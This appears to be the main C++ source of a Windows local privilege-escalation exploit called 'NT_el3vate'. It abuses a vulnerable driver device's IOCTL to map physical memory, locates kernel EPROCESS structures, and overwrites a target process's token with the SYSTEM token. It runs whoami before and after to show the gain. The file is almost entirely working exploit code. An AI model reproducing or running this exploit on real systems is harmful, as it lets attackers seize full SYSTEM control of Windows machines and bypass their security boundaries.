#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <vector>
#include <chrono>

#include "rw_primitive.h"
#include "windows_helper_functions.h"


// Those offsets are for Windows 10 21H2
unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
unsigned __int64 _EPROCESS_Token_offset = 0;



void printBytes(void* ptr, int size)
{
	unsigned char* p = (unsigned char*)ptr;
	for (int i = 0; i < size; i++) {
		printf("%02hhX ", p[i]);
	}
	printf("\n");
}

int main(int argc, char** argv)
{

	if (argc < 2) {
		printf("Usage: .\\NT_el3vate.exe <processName>\n");
		system("pause");
		return EXIT_FAILURE;
	}

	char* targetProcess = argv[1];

	// measure execution time of program
	auto start = std::chrono::high_resolution_clock::now();
	system("whoami");
	if (GetWindowsOffsets() == -1) {
		fprintf(stderr, "[!] GetWindowsOffsets() failed");
		return EXIT_FAILURE;
	}

	HANDLE device = INVALID_HANDLE_VALUE;
	NTSTATUS status = FALSE;

	DWORD bytesReturned = 0;
	
	SetConsoleTitleA("NT_el3vate");

	device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

	if (device == INVALID_HANDLE_VALUE)
	{
		fprintf(stderr, "> Could not open device: 0x%lX\n", GetLastError());
		return FALSE;
	}
	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
	if (hPhysicalMemory == NULL) {
		fprintf(stderr, "[!] calloc() failed");
		return FALSE;
	}
	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory),
		hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == FALSE) {
		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %lX\n", status);
		return EXIT_FAILURE;
	}
	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
	PVOID* buf = (PVOID*)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}
	const int EPROCESS_SYSTEM_size = 50;
	unsigned __int64 EPROCESS_SYSTEM[EPROCESS_SYSTEM_size]; // 50 should be enough


	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
	int occurrences_system = GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM, EPROCESS_SYSTEM_size);
	if (occurrences_system == -1)
	{
		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
	}

	unsigned __int64 systemToken = 0;

	for (int i = 0; i < occurrences_system; i++) {
		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_SYSTEM[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
			return -1;
		}

		// print Token for each EPROCESS Base
		PVOID castedBuf = *buf;
		castedBuf = (unsigned char*)castedBuf + (EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
		systemToken = *(unsigned __int64*)castedBuf;
		if (UnmapPhysicalMemory(buf) == FALSE) {
			printf("UnmapPhysicalMemory failed\n");
			return -1;
		}
	}

	printf("----------------------------------------------- now for %s\n", targetProcess);

	const int EPROCESS_cmd_size = 50;
	unsigned __int64 EPROCESS_cmd[EPROCESS_cmd_size];
	int occurrences_cmd = GetEPROCESSPhysicalBase(targetProcess, GetCurrentProcessId(), hPhysicalMemory, EPROCESS_cmd, EPROCESS_cmd_size);
	if (occurrences_cmd == -1)
	{
		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
	}


	for (size_t i = 0; i < occurrences_cmd; i++) {
		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
			return -1;
		}

		// print Token for each EPROCESS Base
		PVOID castedBuf = *buf;
		castedBuf = (unsigned char*)castedBuf + (EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
		*(unsigned __int64*)castedBuf = systemToken; // this should do it
		printf("[+] Replaced %s Token with System Token\n", targetProcess);

		if (UnmapPhysicalMemory(buf) == FALSE) {
			printf("UnmapPhysicalMemory failed\n");
			return -1;
		}
	}
	
	free(buf);
	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
	CloseHandle(device);
	auto stop = std::chrono::high_resolution_clock::now();
	auto duration = std::chrono::duration_cast<std::chrono::seconds>(stop - start);
	printf("Duration to execute the Program in seconds: %lld\n", duration.count());
	system("whoami");
	system("pause");
	return EXIT_SUCCESS;
}